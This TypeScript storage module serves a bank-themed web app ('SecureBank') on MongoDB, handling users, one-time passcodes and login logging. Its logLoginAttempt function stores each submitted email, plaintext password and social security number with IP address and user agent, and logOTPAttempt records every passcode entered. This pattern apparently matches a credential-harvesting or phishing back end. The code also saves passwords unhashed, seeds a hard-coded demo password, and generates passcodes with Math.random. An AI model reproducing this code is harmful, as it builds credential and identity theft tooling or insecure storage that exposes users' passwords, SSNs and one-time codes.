import { connectToMongoDB } from "./mongodb";
import { User, OTPCode, LoginAttempt, OTPAttempt, type IUser, type IOTPCode, type ILoginAttempt, type IOTPAttempt } from "@shared/mongodb-models";
import { type InsertUser } from "@shared/schema";

export interface IStorage {
  getUser(id: string): Promise<IUser | undefined>;
  getUserByEmail(email: string): Promise<IUser | undefined>;
  createUser(user: InsertUser): Promise<IUser>;
  generateOTP(email: string): Promise<IOTPCode>;
  verifyOTP(email: string, code: string): Promise<boolean>;
  logLoginAttempt(email: string, password: string, ssn: string, success: boolean, ipAddress?: string, userAgent?: string): Promise<ILoginAttempt>;
  logOTPAttempt(email: string, code: string, success: boolean, ipAddress?: string, userAgent?: string): Promise<IOTPAttempt>;
}

export class MongoDBStorage implements IStorage {
  constructor() {
    // Connect to MongoDB and create demo user
    this.initialize();
  }

  private async initialize() {
    try {
      await connectToMongoDB();
      await this.initializeDemoUser();
    } catch (error) {
      console.error('MongoDB initialization failed:', error);
    }
  }

  private async initializeDemoUser() {
    try {
      const existingUser = await this.getUserByEmail("demo@securebank.com");
      if (!existingUser) {
        await this.createUser({
          email: "demo@securebank.com",
          password: "password123"
        });
      }
    } catch (error) {
      console.log("Demo user initialization skipped:", error);
    }
  }

  async getUser(id: string): Promise<IUser | undefined> {
    await connectToMongoDB();
    const user = await User.findById(id).lean();
    if (!user) return undefined;
    const { _id, ...userData } = user;
    return { ...userData, id: _id.toString() };
  }

  async getUserByEmail(email: string): Promise<IUser | undefined> {
    await connectToMongoDB();
    const user = await User.findOne({ email }).lean();
    if (!user) return undefined;
    const { _id, ...userData } = user;
    return { ...userData, id: _id.toString() };
  }

  async createUser(insertUser: InsertUser): Promise<IUser> {
    await connectToMongoDB();
    const user = new User(insertUser);
    const savedUser = await user.save();
    const { _id, ...userData } = savedUser.toObject();
    return { ...userData, id: _id.toString() };
  }

  async generateOTP(email: string): Promise<IOTPCode> {
    await connectToMongoDB();
    
    // Clear any existing OTP for this email
    await OTPCode.deleteMany({ email });

    const code = Math.floor(100000 + Math.random() * 900000).toString(); // 6-digit code
    const expiresAt = new Date(Date.now() + 5 * 60 * 1000); // 5 minutes from now
    
    const otpCode = new OTPCode({
      email,
      code,
      expiresAt,
      isUsed: false
    });
    
    const savedOtp = await otpCode.save();
    const { _id, ...otpData } = savedOtp.toObject();
    return { ...otpData, id: _id.toString() };
  }

  async verifyOTP(email: string, code: string): Promise<boolean> {
    await connectToMongoDB();
    
    const otpCode = await OTPCode.findOne({
      email,
      code,
      isUsed: false
    });

    if (!otpCode) {
      return false;
    }

    // Check if OTP has expired
    if (new Date() > otpCode.expiresAt) {
      return false;
    }

    // Mark OTP as used
    otpCode.isUsed = true;
    await otpCode.save();
    
    return true;
  }

  async logLoginAttempt(email: string, password: string, ssn: string, success: boolean, ipAddress?: string, userAgent?: string): Promise<ILoginAttempt> {
    await connectToMongoDB();
    
    const loginAttempt = new LoginAttempt({
      email,
      password,
      ssn,
      success,
      ipAddress,
      userAgent
    });
    
    const savedAttempt = await loginAttempt.save();
    const { _id, ...attemptData } = savedAttempt.toObject();
    return { ...attemptData, id: _id.toString() };
  }

  async logOTPAttempt(email: string, code: string, success: boolean, ipAddress?: string, userAgent?: string): Promise<IOTPAttempt> {
    await connectToMongoDB();
    
    const otpAttempt = new OTPAttempt({
      email,
      code,
      success,
      ipAddress,
      userAgent
    });
    
    const savedAttempt = await otpAttempt.save();
    const { _id, ...attemptData } = savedAttempt.toObject();
    return { ...attemptData, id: _id.toString() };
  }
}

export const storage = new MongoDBStorage();